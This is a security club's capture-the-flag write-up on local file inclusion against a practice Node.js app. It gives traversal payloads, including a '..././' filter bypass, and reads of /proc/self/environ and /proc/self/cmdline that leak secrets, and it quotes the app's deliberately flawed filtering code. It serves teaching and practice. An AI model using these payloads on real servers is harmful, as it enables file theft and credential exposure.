---
layout: post
title:  "local file inclusion (lfi)"
date:   2021-10-11
categories: web
---

Last meeting, we talked about local file inclusion, which is a pretty dangerous vulnerability. We can read files we aren't supposed to, and in certain cases even gain code execution on the server itself, which is impossible to do with XSS.

The lecture can be found [here](https://docs.google.com/presentation/d/1t2_tqFF-Y_2YbOrqpOI1DQoF7KX-QttLKGd-qjn5npo/edit#slide=id.p).

As usual, there are multiple flags in increasing levels of difficulty.

1. [single traversal](#flag-1-single-traversal)
2. [double traversal](#flag-2-double-traversal)
3. [full source](#flag-3-full-source)
4. [environ](#flag-4-environ)
5. [cmdline](#flag-5-cmdline)

#### flag 1: single traversal
Assuming you have played around on the site, you probably noticed that the `/readFile` endpoint takes a URL parameter, `filename`. For example, `/readFile?filename=deetsicing%2Farchthumbs.png` would show you a very cool picture of a blue A with eyes and shades giving you a thumbs up.

![archthumbs.png](/writeups/assets/images/10-11-21/archthumbs.png)

Reading the source code hints that there is a flag at `./stuff/flag.txt`. However, the only files we can easily access are in `./stuff/things`.

![filesystem.png](/writeups/assets/images/10-11-21/fs.png)


Anything that we pass in as `filename` will be more or less just appended to `./stuff/things/`. See if you can reason out how the archthumbs.png is located.


To get out of `things/`, all we have to do is use the Linux shorthand for parent directory, `../`.

So the full path we want is `./stuff/things/../flag.txt`, and our `filename` will be `../flag.txt`.

Flag:
```
Flag 1: flag{up_up_4nd_4w4y}

This is a node.js project. What file is in every node.js project?
If you can't find it, try going up another directory or two.

Your goal is to use this file to leak the full source code.
```

#### flag 2: double traversal
Now it seems our goal is to get a file that all node.js projects have. From some googling or background experience we know that we need a `package.json`. But `filename=../package.json` returns nothing. Let's try to go up one directory, with `../../package.json`.

But wait, in the source code it detects if we have 2 `../`s, and replaces them all with an empty string (deletes them out of the string):

```js
else if (traversals.length == 2) {
    // Okay maybe this is kinda bad.
    filepath = filepath.replace(/\.\.\//g, "");
}
```

However, consider a string x where x is made of substrings `a + b + c`. When b is filtered out, the remaining string will be `a + c`.

What if `a + c` formed `../` too, but `a` and `c` != `../`?

One possible solution is the string `..././`. The `../` will be filtered out, and a new `../` will be formed.

To go up two directories, we can stick two of them together to form a `../../` after the filter is applied.

So our final `filename` will be `..././..././package.json`.

Flag:
```json
{
    "name": "lfi",
    "version": "1.0.0",
    "description": "Flag 2: flag{y0u_f0und_th3_p4ck4ge_bu7_c4n_y0u_g3t_th3_s0urc3}",
    "main": "myprogram.js",
    "scripts": {
        "test": "echo \"all the 0 tests passed\""
    },
    "repository": {
        "type": "git",
        "url": "https://nunya.business"
    },
    "keywords": [
        "lfi"
    ],
    "author": "blairsec",
    "license": "UNLICENSED",
    "dependencies": {
        "express": "^4.17.1",
        "highlight.js": "^10.3.1",
        "morgan": "^1.10.0",
        "cookie-parser": "^1.4.5"
    }
}
```

#### flag 3: full source
Reading flag 2, we are encouraged to find the source code. The `main` key of `package.json` points us to `myprogram.js`, and we can use the same payload as for flag 2.

Filename: `..././..././myprogram.js`

```js
// Flag 3: flag{th3_s0urc3_n3v3r_t3lls_4_li3}
// Head over to the main page or to /sourceButBetter for a highlighted version :)
// this is all unimportant, scroll to the bottom
const express = require("express");
const morgan = require("morgan");
const fs = require("fs");
```


#### flag 4: environ

Reading the comment from flag 3, we go to `/sourceButBetter` to get a pretty and syntax-highlighted source code.

The important code is:
```js
// =========================================================
// this is where things get important
// =========================================================

const staticMount = "/static";
const staticDir = path.join(__dirname, "static");

// can you somehow get these values?
const superSecretFlag1 = process.env.LEFLAG;
const superSecretFlag2 = process.argv[2];

app.get(staticMount + "/*", (req, res) => {
    if (!req.originalUrl.startsWith(staticMount)) {
        res.type("text/plain")
            .status(400)
            .send("idk what wizardry you're pulling but I don't like it");
    }
    let filepath = req.originalUrl.substr(staticMount.length);
    if (!res.locals.authed && req.originalUrl.includes("../")) {
        // if you've leaked this source this won't be an issue
        // just make sure you send your requests with
        // the super_secret_password cookie
        res.type("text/plain")
            .status(400)
            .send("stop trying to skip steps smh my head");
    }
    const joined = path.join(staticDir, filepath);
    try {
        const contents = limitedRead(joined);
        res.type(path.extname(joined) || "text/plain").send(contents);
    } catch (err) {
        res.type("text/plain")
            .status(404)
            .send(debug ? `wtmoo there's no ${joined} file` : `file not found`);
    }
});
```

The gist of the source is that instead of using a `filename` parameter in the URL, we now need to use `/static/*` to include local files.

It also shows us that there are two flags, one in the environment variables and one in the command used to run the app (`argv`).

To achieve lfi, we can use `/static/?<path>`. I think the reason this works is that the `?` functions as both a query string (so the web proxy doesn't collapse it) and a "fake" directory to get out of (for lfi).

The issue with using `/static/../../../` and so on is that it will be collapsed into the site root, `lfi.blairsec.mbhs.edu/`, instead of the server's filesystem root.

Again, not too sure why it works but it does.

To look at a process' environment variables, we can read `/proc/self/environ`: `/static/?../../../../../../../proc/self/environ`. The `../` spam is to make sure that we are at the server root (`/`).

Flag: `flag{4lm0st_th3r3_jus7_0n3_m0r3_th1ng_t0_d0}`

#### flag 5: cmdline

Similarly for part 5, we can also just take advantage of `/proc/self` again and this time read `/proc/self/cmdline`, which will give the full command used to launch the process.

Flag: `flag{c0ng4ts_0n_g3tt1ng_4ll_th3_fl4gs}`

"congats".

~ josh